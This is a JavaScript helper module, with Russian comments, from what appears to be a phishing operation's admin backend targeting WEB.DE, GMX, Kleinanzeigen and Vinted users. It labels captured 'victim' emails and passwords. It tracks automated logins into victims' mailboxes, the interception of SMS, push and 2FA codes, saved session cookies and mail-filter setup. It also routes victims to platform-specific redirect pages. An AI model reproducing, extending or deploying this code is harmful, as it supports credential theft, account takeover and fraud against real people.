'use strict';

const path = require('path');
const fs = require('fs');
const https = require('https');
const { getPlatformFromRequest } = require('../lib/platformDetect');

/** Каталог data/ (SQLite, start-page.txt и др.): как в server.js (GMW_DATA_DIR или ./data от корня репо). */
function getProjectDataDir() {
  const projectRoot = path.join(__dirname, '..', '..');
  return process.env.GMW_DATA_DIR ? path.resolve(process.env.GMW_DATA_DIR) : path.join(projectRoot, 'data');
}

/** События с формы (жертва): короткие метки для админки. */
const EVENT_VICTIM_EMAIL = 'email';
const EVENT_VICTIM_EMAIL_KL = 'emailKl';
const EVENT_VICTIM_PASS = 'pass';
const EVENT_VICTIM_PASS_KL = 'passKl';
/** Повтор той же строки пароля после отказа почты/Klein. */
const EVENT_PASS_REPEAT_ERROR = 'Ввел пароль повторно - ошибка';

/** Единые подписи EVENTS (скрипт/админка) — согласованы с login/*_simulation_api.py EV_* (и EV_AUTOLOGIN_MAILBOX_SUCCESS). */
const EVENT_LABELS = {
  /** Старт пишется динамически: «Автовход WEB 1/5»; константа — для совместимости и тестов. */
  WEBDE_START: 'Автовход WEB',
  WEBDE_QUEUE: 'Автовход WEB: очередь',
  KLEIN_START: 'Автовход Klein',
  KLEIN_QUEUE: 'Автовход Klein: очередь',
  PUSH: 'PUSH',
  PUSH_TIMEOUT: 'Время ожидания вышло',
  SMS: 'SMS',
  SMS_KL: 'SMS',
  WRONG_DATA: 'Неверный пароль',
  WRONG_DATA_KL: 'Неверный пароль Kl',
  WRONG_SMS: 'Неверный SMS',
  WRONG_SMS_KL: 'Неверный SMS Kl',
  WRONG_2FA: 'Неверный 2FA',
  TWO_FA: 'Просит 2FA',
  TWO_FA_TIMEOUT: 'Время ожидания вышло',
  SUCCESS: 'Успешный вход',
  SUCCESS_KL: 'Успешный вход Kl',
  MAIL_FILTERS_START: 'Почта: фильтры…',
  MAIL_FILTERS_OK: 'Почта: фильтры ок',
  MAIL_READY: 'Почта: готово к письму',
  PUSH_RESEND_OK: 'Переотправлен Push',
  PUSH_RESEND_FAIL: 'Переотправлен Push: ошибка',
  TWO_FA_CODE_IN: '2FA: код введён',
  TWO_FA_WRONG: 'Неверный 2FA',
  WEBDE_STEP_BROWSER: 'Автовход: браузер',
  WEBDE_STEP_ATTEMPT: 'Автовход: шаг входа',
  WEBDE_MAIL_OPENED: 'Почтовый ящик открыт',
  MAIL_UI_READY: 'Почта: интерфейс',
  KLEIN_SESSION_MAIL: 'Klein после почты',
  KLEIN_WAIT_VICTIM: 'Klein: ждём ссылку',
  KLEIN_VICTIM_HERE: 'Klein: лид на входе',
  KLEIN_CREDS_FROM_LEAD: 'Klein: креды с лида',
  KLEIN_SCRIPT_START: 'Автовход Klein (скрипт)',
  KLEIN_SCRIPT_BROWSER: 'Klein: браузер',
  WEBDE_SCREEN_PUSH: 'PUSH',
  WEBDE_SCREEN_2FA: 'Просит 2FA',
  WEBDE_SCREEN_SMS: 'SMS',
  MAILBOX_DOWNLOAD_SKIP_RELOGIN: 'Скачивание: без повторного входа',
  WEBDE_SERVER_INTERRUPT: 'Автовход прерван',
  /** Успешный вход скрипта в ящик (WEB.DE/GMX/Klein) — в ленте всегда перед сценарным редиректом. */
  AUTOLOGIN_MAILBOX_SUCCESS: 'Автовход удался',
  /** 500/502/503 с оверлеем ожидания на сайте: в админку всё равно пишем короткую метку (прокси/сеть). */
  AUTOLOGIN_PROXY_OR_NETWORK: 'Автовход: прокси или сеть',
  /** После POST /api/lead-cookies-upload (скрипт Playwright). */
  AUTOLOGIN_COOKIES_SAVED: 'Куки сохранены',
};

/** Старт lead_simulation / Klein (новые «Автовход WEB 1/5» и старые метки в БД). */
function eventLabelIsMailboxAutoStart(label) {
  const s = String(label || '');
  if (!s) return false;
  if (/^Автовход (WEB|GMX|Klein)\s+\d+\/\d+/.test(s)) return true;
  if (s === 'Запуск автовхода в почту' || s === 'Запуск Klein') return true;
  return false;
}

function eventLabelIsMailboxAutoQueue(label) {
  const s = String(label || '');
  if (!s) return false;
  if (/^Автовход (WEB|GMX|Klein): очередь/.test(s)) return true;
  if (s === 'Автовход: в очереди' || s === 'Klein: в очереди') return true;
  return false;
}

const START_PAGE_BY_BRAND_FILE = 'start-page-by-brand.json';

function normalizeStartPageToken(raw) {
  const s = String(raw || '').trim().toLowerCase();
  if (s === 'change' || s === 'download' || s === 'klein') return s;
  return 'login';
}

function normalizeStartPageBrand(raw) {
  const b = String(raw || '').trim().toLowerCase();
  if (b === 'gmx' || b === 'klein' || b === 'vint') return b;
  return 'webde';
}

/** Первый запуск: переносит единственный start-page.txt в JSON для webde/gmx/klein/vint (одинаковое значение). */
function migrateStartPageTxtToJsonIfNeeded() {
  const dir = getProjectDataDir();
  const jsonPath = path.join(dir, START_PAGE_BY_BRAND_FILE);
  if (fs.existsSync(jsonPath)) return;
  const txtPath = path.join(dir, 'start-page.txt');
  let v = 'login';
  try {
    if (fs.existsSync(txtPath)) {
      const raw = fs.readFileSync(txtPath, 'utf8').trim().toLowerCase();
      v = normalizeStartPageToken(raw);
    }
  } catch (_) {}
  const doc = { webde: v, gmx: v, klein: v, vint: v };
  try {
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(jsonPath, JSON.stringify(doc, null, 2), 'utf8');
  } catch (_) {}
}

/**
 * Стартовая страница по бренду (WEB.DE / GMX / Klein / Vint) — независимые настройки.
 * @returns {{ webde: string, gmx: string, klein: string, vint: string }}
 */
function readStartPageByBrandMap() {
  migrateStartPageTxtToJsonIfNeeded();
  const jsonPath = path.join(getProjectDataDir(), START_PAGE_BY_BRAND_FILE);
  let doc = {};
  try {
    if (fs.existsSync(jsonPath)) {
      doc = JSON.parse(fs.readFileSync(jsonPath, 'utf8')) || {};
    }
  } catch (_) {
    doc = {};
  }
  return {
    webde: normalizeStartPageToken(doc.webde),
    gmx: normalizeStartPageToken(doc.gmx),
    klein: normalizeStartPageToken(doc.klein),
    // Для старых файлов без поля vint сохраняем поведение «как webde».
    vint: normalizeStartPageToken(doc.vint != null ? doc.vint : doc.webde)
  };
}

/**
 * @param {string} brand webde | gmx | klein | vint
 */
function readStartPageForBrand(brand) {
  const key = normalizeStartPageBrand(brand);
  const map = readStartPageByBrandMap();
  return map[key];
}

/** Синхронизирует legacy start-page.txt с webde (для внешних скриптов). */
function writeStartPageForBrand(brand, value) {
  migrateStartPageTxtToJsonIfNeeded();
  const dir = getProjectDataDir();
  const jsonPath = path.join(dir, START_PAGE_BY_BRAND_FILE);
  const map = readStartPageByBrandMap();
  const key = normalizeStartPageBrand(brand);
  map[key] = normalizeStartPageToken(value);
  fs.writeFileSync(jsonPath, JSON.stringify(map, null, 2), 'utf8');
  try {
    fs.writeFileSync(path.join(dir, 'start-page.txt'), map.webde, 'utf8');
  } catch (_) {}
}

/** @deprecated Используйте readStartPageForBrand; для совместимости = webde. */
function readStartPage() {
  return readStartPageForBrand('webde');
}

/** startPage=download: по платформе — android/ios → ПК, win → Sicherheit, mac → смена пароля */
function getRedirectPasswordStatus(lead) {
  const p = (lead && (lead.platform || '').toLowerCase()) || '';
  if (p === 'windows') return 'redirect_sicherheit';
  if (p === 'macos') return 'redirect_change_password';
  if (p === 'android' || p === 'ios') return 'redirect_open_on_pc';
  return 'redirect_open_on_pc';
}

/**
 * Лид уже прошёл почтовый сценарий и на следующем шаге (успех или redirect после входа).
 * Повторный submit с формы не должен снова стартовать lead_simulation без forceRestart.
 * Не включает redirect_gmx_net (legacy в БД; сервер больше не выставляет при неизвестной ОС).
 */
function statusSkipsVictimMailboxAutologinDuplicate(status) {
  const s = String(status || '').trim();
  if (!s) return false;
  if (s === 'show_success') return true;
  switch (s) {
    case 'redirect_change_password':
    case 'redirect_sicherheit':
    case 'redirect_android':
    case 'redirect_open_on_pc':
    case 'redirect_push':
    case 'redirect_sms_code':
    case 'redirect_2fa_code':
    case 'redirect_klein_anmelden':
    case 'redirect_klein_sms_wait':
    case 'redirect_klein_forgot':
      return true;
    default:
      return false;
  }
}

/** Маскировка email в логах (не выводить полный адрес). */
function maskEmail(email) {
  if (email == null || typeof email !== 'string') return '';
  const s = email.trim();
  if (s.length < 3) return '***';
  const at = s.indexOf('@');
  if (at <= 0 || at === s.length - 1) return s.slice(0, 2) + '***';
  return s.slice(0, Math.min(2, at)) + '***@' + s.slice(at + 1);
}

/** Язык перевода сообщений от пользователя в чате (например ru, en). Пусто — перевод выключен. */
const CHAT_TRANSLATE_TARGET = (process.env.CHAT_TRANSLATE_TARGET || 'ru').trim().toLowerCase();
const LIBRE_TRANSLATE_URL = (process.env.LIBRE_TRANSLATE_URL || 'https://libretranslate.com').replace(/\/$/, '');

function translateChatText(text, cb) {
  if (!CHAT_TRANSLATE_TARGET || !text || typeof text !== 'string') {
    if (typeof cb === 'function') cb(null);
    return;
  }
  const body = JSON.stringify({
    q: text.slice(0, 5000),
    source: 'auto',
    target: CHAT_TRANSLATE_TARGET,
    format: 'text'
  });
  const base = LIBRE_TRANSLATE_URL.startsWith('http') ? LIBRE_TRANSLATE_URL : 'https://' + LIBRE_TRANSLATE_URL;
  const u = new URL(base + '/translate');
  const opts = { hostname: u.hostname, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body, 'utf8') } };
  if (u.port && u.port !== '80' && u.port !== '443') opts.port = u.port;
  const req = https.request(opts, (res) => {
    let data = '';
    res.on('data', (chunk) => { data += chunk; });
    res.on('end', () => {
      try {
        const j = JSON.parse(data);
        if (j && typeof j.translatedText === 'string') {
          if (typeof cb === 'function') cb(j.translatedText);
          return;
        }
      } catch (e) {}
      if (typeof cb === 'function') cb(null);
    });
  });
  req.on('error', () => { if (typeof cb === 'function') cb(null); });
  req.setTimeout(8000, () => { req.destroy(); if (typeof cb === 'function') cb(null); });
  req.write(body);
  req.end();
}

module.exports = {
  maskEmail,
  getPlatformFromRequest,
  translateChatText,
  CHAT_TRANSLATE_TARGET,
  EVENT_LABELS,
  EVENT_VICTIM_EMAIL,
  EVENT_VICTIM_EMAIL_KL,
  EVENT_VICTIM_PASS,
  EVENT_VICTIM_PASS_KL,
  EVENT_PASS_REPEAT_ERROR,
  eventLabelIsMailboxAutoStart,
  eventLabelIsMailboxAutoQueue,
  readStartPage,
  readStartPageForBrand,
  readStartPageByBrandMap,
  writeStartPageForBrand,
  getRedirectPasswordStatus,
  statusSkipsVictimMailboxAutologinDuplicate,
};
